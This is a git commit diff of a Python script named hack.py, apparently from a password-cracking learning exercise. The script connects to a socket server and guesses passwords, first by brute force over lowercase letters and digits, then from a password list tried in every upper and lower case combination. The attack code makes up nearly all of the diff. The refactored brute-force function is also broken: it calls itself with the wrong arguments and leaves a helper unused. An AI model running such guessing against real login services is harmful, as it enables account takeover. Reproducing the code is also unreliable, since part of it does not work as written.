7c4bbd74d5ec8199c0184bde5c53349fd094c673
Mikhail Pisman <mike.pisman@gmail.com>
2020-08-22 19:55:40 -0700

    Stage 3 Completed In this stage, the program get a file with possible passwords. Parsing line by line, the program atempts each password with different combinations of lower and upper case characters.

--- hack.py
+++ hack.py
@@ -2,30 +2,55 @@ import sys
 import socket
 from itertools import product
 
+chars = [chr(i) for i in list(range(97, 123)) + list(range(48, 58))]
 
-def main():
-    _, ip, port = sys.argv
-    chars = list(range(97, 123)) + list(range(48, 58))
-    chars = [chr(i) for i in chars]
 
-    def bruteforce(charset, length):
+def bruteforce(sock):
+    def pass_gen():
         return (''.join(i) for i in product(chars, repeat=length))
 
     length = 0
+
+    while True:
+        length += 1
+        for attempt in bruteforce(chars, length):
+            sock.send(attempt.encode())
+            response = sock.recv(1024).decode()
+
+            if response == "Connection success!":
+                print(attempt)
+                return
+            elif response == "Too many attempts":
+                return
+
+
+def dict_based(sock):
+    passwords = []
+    with open('hacking/password.txt', 'r') as f:
+        for line in f:
+            passwords.append(line.strip())
+
+    for word in passwords:
+        cases = map(''.join, product(*zip(word.upper(), word.lower())))
+        for i in cases:
+            sock.send(i.encode())
+            response = sock.recv(1024).decode()
+
+            if response == "Connection success!":
+                print(i)
+                return
+            elif response == "Too many attempts":
+                return
+
+
+def main():
+    _, ip, port = sys.argv
+
     with socket.socket() as s:
         s.connect((ip, int(port)))
+        # bruteforce(s)
+        dict_based(s)
 
-        while True:
-            length += 1
-            for attempt in bruteforce(chars, length):
-                s.send(attempt.encode())
-                response = s.recv(1024).decode()
-
-                if response == "Connection success!":
-                    print(attempt)
-                    return
-                elif response == "Too many attempts":
-                    return
 
 
 if __name__ == '__main__':
